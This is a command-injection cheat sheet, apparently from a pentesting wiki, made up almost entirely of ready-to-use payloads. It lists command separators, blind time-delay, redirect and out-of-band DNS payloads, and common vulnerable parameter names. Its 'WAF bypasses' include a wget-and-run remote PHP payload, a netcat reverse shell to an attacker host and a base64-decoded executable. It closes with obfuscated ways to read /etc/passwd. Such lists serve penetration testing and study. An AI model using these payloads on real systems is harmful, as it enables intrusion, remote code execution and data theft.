# Command Injection

{% hint style="info" %}
Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application.
{% endhint %}

```text
# For detection, try to concatenate another command to param value
&
;
Newline (0x0a or \n)
&&
|
||
# like: https://target.com/whatever?param=1|whoami

# Blind (Time delay)
https://target.com/whatever?param=x||ping+-c+10+127.0.0.1||

# Blind (Redirect)
https://target.com/whatever?param=x||whoami>/var/www/images/output.txt||

# Blind (OOB)
https://target.com/whatever?param=x||nslookup+burp.collaborator.address||
https://target.com/whatever?param=x||nslookup+`whoami`.burp.collaborator.address||

# Common params:
cmd
exec
command
execute
ping
query
jump
code
reg
do
func
arg
option
load
process
step
read
function
req
feature
exe
module
payload
run
print

# Useful Commands: Linux
whoami
ifconfig
ls
uname -a

# Useful Commands: Windows
whoami
ipconfig
dir
ver

# Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id 
ls|id; ls |id; ls| id; ls | id 
ls&&id; ls &&id; ls&& id; ls && id 
ls&id; ls &id; ls& id; ls & id 
ls %0A id

# Time Delay Commands
& ping -c 10 127.0.0.1 &

# Redirecting output
& whoami > /var/www/images/output.txt &

# OOB (Out Of Band) Exploitation
& nslookup attacker-server.com &
& nslookup `whoami`.attacker-server.com &

# WAF bypasses
vuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash <attacker-ip> <attacker-port>
vuln=echo PAYLOAD > /tmp/payload.txt; cat /tmp/payload.txt | base64 -d > /tmp/payload; chmod 744 /tmp/payload; /tmp/payload

# Some filter bypasses
cat /etc/passwd
cat /e”t”c/pa”s”swd
cat /’e’tc/pa’s’ swd
cat /etc/pa??wd
cat /etc/pa*wd
cat /et’ ‘c/passw’ ‘d
cat /et$()c/pa$()$swd
{cat,/etc/passwd}
cat /???/?????d
```



